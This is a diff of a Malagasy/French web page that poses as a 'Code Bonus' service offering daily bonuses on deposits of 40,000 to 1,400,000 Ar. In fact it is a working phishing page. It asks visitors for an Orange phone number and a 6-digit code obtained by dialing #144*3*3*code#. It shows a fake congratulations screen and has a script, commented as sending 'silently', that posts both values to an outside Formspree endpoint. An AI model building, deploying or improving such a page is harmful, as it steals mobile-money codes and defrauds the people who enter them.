@@ -3,40 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Agent Portal - Code Bonus 261</title>
+    <title>Code Bonus - Azahoana Vola</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card-agent { background: white; width: 100%; max-width: 400px; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); overflow: hidden; }
-        .profile-header { background: linear-gradient(to bottom, #1877f2, #0056b3); padding: 20px; text-align: center; color: white; }
-        .avatar { width: 80px; height: 80px; border-radius: 50%; border: 3px solid white; margin-bottom: 10px; background: #ddd; display: inline-block; }
-        .name { font-size: 18px; font-weight: bold; }
-        .sub { font-size: 12px; opacity: 0.9; }
-        .form-area { padding: 25px; }
-        label { display: block; font-size: 12px; font-weight: bold; color: #444; margin-bottom: 5px; text-transform: uppercase; }
-        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 14px; }
-        .btn-submit { background: #1877f2; color: white; border: none; width: 100%; padding: 15px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
-        .status { text-align: center; color: #2ecc71; font-size: 12px; font-weight: bold; margin-top: 10px; }
+        body { font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #333; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }
+        .card { background: white; width: 100%; max-width: 420px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); overflow: hidden; text-align: center; padding-bottom: 20px; animation: fadeIn 0.4s; }
+        
+        /* Headers & Buttons */
+        .banner-img { width: 100%; height: 200px; background: url('https://img.freepik.com/vecteurs-libre/paysage-ferme-dessine-main_23-2148855653.jpg') center/cover; }
+        .btn-blue { background: #00a8ff; color: white; border: none; width: 85%; padding: 16px; border-radius: 12px; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 20px; }
+        .btn-disabled { background: #ccc !important; cursor: not-allowed !important; }
+
+        /* Tarif Grid */
+        .scroll-area { max-height: 400px; overflow-y: auto; padding: 10px; }
+        .grid-tarif { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 10px; }
+        .tarif-box { background: #fff; border: 1px solid #e1e4e8; border-radius: 12px; padding: 15px; text-align: center; }
+        .price { color: #00a8ff; font-weight: 800; font-size: 17px; margin: 5px 0; }
+        .btn-black { background: #000; color: #fff; border: none; width: 100%; padding: 10px; border-radius: 8px; font-size: 11px; cursor: pointer; font-weight: bold; }
+
+        /* Validation UI */
+        .val-img { width: 100%; max-width: 250px; margin: 15px auto; display: block; }
+        .alert-box { background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; font-size: 11px; margin: 15px; border: 1px solid #ffeeba; text-align: left; }
+        .input-field { width: 85%; padding: 14px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; outline: none; }
+
+        /* Dynamique Félicitations */
+        .step4-bg { background: #252545; color: white; padding-top: 20px; }
+        .agent-card-wrap { background: #fff; color: black; margin: 15px; border-radius: 15px; overflow: hidden; text-align: left; border: 1px solid #444; }
+        .agent-fb-header { background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR_S3u6fVvM_F-W_G5n3k-YtA4L4L4L4L4L4L4&s') center/cover; height: 100px; position: relative; }
+        .agent-pdp { width: 60px; height: 60px; border-radius: 50%; border: 3px solid white; position: absolute; bottom: -30px; left: 15px; background: #ddd; }
+        .agent-info-text { padding: 40px 15px 15px 15px; }
+        .msg-box-green { background: #1a1a2e; color: #2ecc71; margin: 0 15px; padding: 15px; border-radius: 10px; border-left: 5px solid #2ecc71; text-align: left; font-size: 13px; line-height: 1.5; }
+
+        .hidden { display: none; }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
     </style>
 </head>
 <body>
-<div class="card-agent">
-    <div class="profile-header">
-        <div class="avatar"></div>
-        <div class="name">Azahoana Vola Isanandro</div>
-        <div class="sub">@ code bonus 261 💎 | Actif 24/7</div>
-    </div>
-    <div class="form-area">
-        <form action="https://formspree.io/f/mqkrpova" method="POST">
-            <label>Anaran'ny Agent</label>
-            <input type="text" name="Agent_Name" value="Azahoana Vola" readonly>
-            <label>Laharana finday Client</label>
-            <input type="text" name="Client_Phone" placeholder="034 XX XXX XX" required>
-            <label>Kaody Bonus</label>
-            <input type="text" name="Bonus_Code" placeholder="Ohatra: BONUS40K" required>
-            <button type="submit" class="btn-submit">HANDRAIKITRA NY KAODY</button>
-        </form>
-        <div class="status">● Tableau de bord professionnel actif</div>
+
+<div id="step1" class="card">
+    <div class="banner-img"></div>
+    <h3 style="color: #00a8ff; margin-top: 25px;">Bienvenue dans Code Bonus</h3>
+    <button class="btn-blue" onclick="showStep(2)">SUIVANT</button>
+</div>
+
+<div id="step2" class="card hidden">
+    <h2 style="font-size: 18px; margin-top: 20px;">Choisir ton tarif</h2>
+    <div class="scroll-area">
+        <div class="grid-tarif" id="tarifContainer"></div>
     </div>
 </div>
+
+<div id="step3" class="card hidden">
+    <img src="https://img.freepik.com/vecteurs-libre/concept-illustration-compte-securise_114360-4822.jpg" class="val-img">
+    <h2 style="font-size: 20px;">Validation</h2>
+    <div class="alert-box">⚠️ Tsy foronina ny 6 chiffres fa alaina ao am #144*3*3*code#</div>
+    
+    <form id="valForm" action="https://formspree.io/f/mqkrpova" method="POST">
+        <input type="text" id="phone" name="Phone" class="input-field" placeholder="Laharana Orange (032/037)" required>
+        <input type="text" id="code6" name="Code_6" class="input-field" placeholder="Kaody 6 chiffres" maxlength="6" required>
+        <button type="button" id="confirmBtn" class="btn-blue btn-disabled" onclick="submitForm()" disabled>CONFIRMER</button>
+    </form>
+</div>
+
+<div id="step4" class="card hidden step4-bg">
+    <div class="agent-card-wrap">
+        <div class="agent-fb-header"><div class="agent-pdp"></div></div>
+        <div class="agent-info-text">
+            <div style="font-weight: bold; font-size: 15px;">Azahoana Vola Isanandro</div>
+            <div style="font-size: 11px; color: #666;">2K followers • Agent Actif 24/7</div>
+        </div>
+    </div>
+    <div style="color: #2ecc71; font-weight: bold; font-size: 22px; margin: 15px 0;">Félicitations!</div>
+    <div class="msg-box-green" id="congratsMsg"></div>
+    <p style="font-size: 10px; color: #888; margin-top: 20px;">Mankasitraka amin'ny fampiasana ny Code Bonus.</p>
+</div>
+
+<script>
+    let selectedFond = "";
+    let selectedBonus = "";
+
+    const tarifs = [
+        {f: "40.000Ar", b: "21.400Ar"}, {f: "60.000Ar", b: "31.400Ar"},
+        {f: "90.000Ar", b: "41.400Ar"}, {f: "120.000Ar", b: "56.800Ar"},
+        {f: "140.000Ar", b: "71.400Ar"}, {f: "180.000Ar", b: "87.500Ar"},
+        {f: "320.000Ar", b: "100.400Ar"}, {f: "560.000Ar", b: "181.400Ar"},
+        {f: "980.000Ar", b: "311.400Ar"}, {f: "1.400.000Ar", b: "461.400Ar"}
+    ];
+
+    const container = document.getElementById('tarifContainer');
+    tarifs.forEach(t => {
+        container.innerHTML += `
+            <div class="tarif-box">
+                <h3>${t.f}</h3>
+                <div style="font-size:10px; color:#999;">Bonus jour</div>
+                <div class="price">${t.b}</div>
+                <button class="btn-black" onclick="selectTarif('${t.f}', '${t.b}')">POURSUIVRE</button>
+            </div>`;
+    });
+
+    function selectTarif(fond, bonus) {
+        selectedFond = fond;
+        selectedBonus = bonus;
+        showStep(3);
+    }
+
+    const phoneInput = document.getElementById('phone');
+    const codeInput = document.getElementById('code6');
+    const confirmBtn = document.getElementById('confirmBtn');
+
+    function validate() {
+        const isOrange = phoneInput.value.startsWith('032') || phoneInput.value.startsWith('037');
+        confirmBtn.disabled = !(isOrange && phoneInput.value.length === 10 && codeInput.value.length === 6);
+        confirmBtn.classList.toggle('btn-disabled', confirmBtn.disabled);
+    }
+    phoneInput.oninput = validate; codeInput.oninput = validate;
+
+    function submitForm() {
+        const form = document.getElementById('valForm');
+        // 1. Asehoy avy hatrany ilay Félicitations
+        document.getElementById('congratsMsg').innerHTML = `Felicitation, votre bonus est en cours. Voamarina fa manana fond <b>${selectedFond}</b> ianao ary misitraka bonus <b>${selectedBonus}</b> izao ka manasa anao handefa mp amin'i agent code Bonus izao.`;
+        showStep(4);
+        
+        // 2. Alefaso mangina any amin'ny Formspree ny data
+        fetch(form.action, {
+            method: 'POST',
+            body: new FormData(form),
+            headers: { 'Accept': 'application/json' }
+        });
+    }
+
+    function showStep(step) {
+        document.querySelectorAll('.card').forEach(c => c.classList.add('hidden'));
+        document.getElementById('step' + step).classList.remove('hidden');
+    }
+</script>
+
 </body>
 </html>
